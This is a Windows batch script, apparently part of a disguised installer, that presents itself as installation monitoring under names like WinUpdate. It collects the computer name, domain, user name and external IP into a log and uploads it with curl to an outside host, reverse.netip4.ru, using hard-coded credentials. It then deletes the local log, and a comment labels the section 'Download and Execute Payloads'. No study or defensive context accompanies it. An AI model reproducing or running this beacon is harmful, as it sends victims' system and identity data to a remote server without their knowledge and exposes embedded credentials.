@echo on
rem *******************************************************
rem Install.St.cmd
rem This Script Sends to Remote Server Monitoring Data
rem from Current Computer Flag of Packets Installation 
rem
rem PARAMETERS:	NONE
rem RETURN:	NONE
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=Install_St
set FIRM_NAME=NIT

rem
rem Set Directories Path
set PATHCMD=%SystemRoot%\System32
set PATHCMDWOW=%SystemRoot%\SysWOW64
set UTIL=c:\Util
set NITSYS=C:\NIT.SYSUPDATE
set PUB1=C:\pub1
set AdminT=C:\Elevation
set TEMPPUB=c:\pub1\Distrib
set UTILPUB=C:\pub1\Util
set curdirforurl=%CD%
set DEST_DIR=C:\NIT.SYSUPDATE
set LIBWSF=%TEMPPUB%\LIB\LIB-WSF
set LIBBAT=%TEMPPUB%\LIB\BAT

rem Initialization Download Variables
rem
set http_pref001=http
set http_host001=file.netip4.ru
set http_port001=80
set http_dir0001=/WinUpdate/
set http_dir0000=/Exponenta/
set http_dir0003=/WinUpdate/WindowsMainUpdate/Other/
set http_echodir=/WinUpdate/InitialCommon/
set http_pref002=http
set http_host002=reverse.netip4.ru
set http_port002=80
set http_dir0000=/tmp/Files/
set http_user001=MSSQLSR
set http_pass001=Admin01234

rem set CURL & WGET Variables
rem
echo Set CURL and WGET Variadles
set CURLEXE=%UTIL%\CURL.EXE
set WGETEXE=%UTIL%\wget.exe

rem Derivatives Variables
set host=%http_pref002%://%http_host002%:%http_port002%%http_dir0000%
set LocalFolder=%UTILPUB%
echo host = %host%
echo Local Folder = %LocalFolder%

rem set stamp Variables
rem
set prefixfilename=inst.st
set now=%DATE: =0% %TIME: =0%
echo now = %now%
for /f "tokens=1-7 delims=/-:., " %%a in ( "%now%" ) do (
    set nowstamp=%%c%%b%%a_%%d%%e
)
echo nowstump = %nowstamp%
set echomessage="Packets is been installed with Success!"

rem set Compilant = COMPUTERNAME@USERDOMAIN
set compilant=%COMPUTERNAME%@%USERDOMAIN%
echo Compilant = %compilant%

rem set Path Variables

rem set File Variables
set localfilename=%prefixfilename%-%compilant%.%nowstamp%.log
set localfile="%LocalFolder%\%localfilename%"

rem Download and Execute Payloads
rem 

rem Create Monitoring file
echo %localfile%:: > %localfile%
echo Message: %echomessage% >> %localfile%
echo Time Stamp: %nowstamp%, Datatime: %now% >> %localfile%
echo COMPUTER/DOMAIN Name: %compilant% >> %localfile%
echo User Name: %USERNAME% >> %localfile%
echo ===***===***=== >> %localfile%
echo External IP: >> %localfile%
"%CURLEXE%" http://ifconfig.me/ip >> %localfile%

rem upload File to server
rem
"%CURLEXE%" -T %localfile% %host% -u %http_user001%:%http_pass001% --verbose

rem Delete File
rem
del /Q /F %localfile%

rem End Payloads

rem The End of the Script
:End
echo The End of %0 Script
